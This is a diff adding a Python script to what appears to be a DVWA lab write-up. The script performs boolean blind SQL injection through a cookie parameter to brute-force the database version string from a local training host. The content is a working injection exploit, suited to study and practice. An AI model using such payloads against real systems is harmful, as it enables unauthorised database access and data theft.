@@ -748,6 +748,29 @@ Python code to brute force version:
 <details><summary markdown="span">Click to see code :diamond_shape_with_a_dot_inside: </summary>
   
 ```python
+import requests
+from requests.structures import CaseInsensitiveDict
+
+headers = CaseInsensitiveDict()
+headers["Cookie"] = "id=1%27+and+length%28version%28%29%29%3E0%23; security=high; PHPSESSID=to84ds41bhba7ub48s10a8qim0"
+url = 'http://192.168.170.131/vulnerabilities/sqli_blind/'
+
+for i in range(100):
+    headers["Cookie"] = f"id=1'+and+length(version())%3d{i}%23; security=high; PHPSESSID=to84ds41bhba7ub48s10a8qim0"
+    r = requests.get(url, headers=headers)
+    if 'User ID exists in the database' in r.text:
+        print(f'length = {i}')
+        length = i
+        break
+j = 1
+for i in range(1, length+1):
+    for s in range(30, 126):
+        headers["Cookie"] = f"id=1'+and+ascii(substring(version(),{i},{j}))%3d{s}%23; security=high; PHPSESSID=to84ds41bhba7ub48s10a8qim0"
+        r = requests.get(url, headers=headers)
+        if 'User ID exists in the database' in r.text:
+            print(chr(s), end='')
+            break
+        j += 1
 
 ```
 
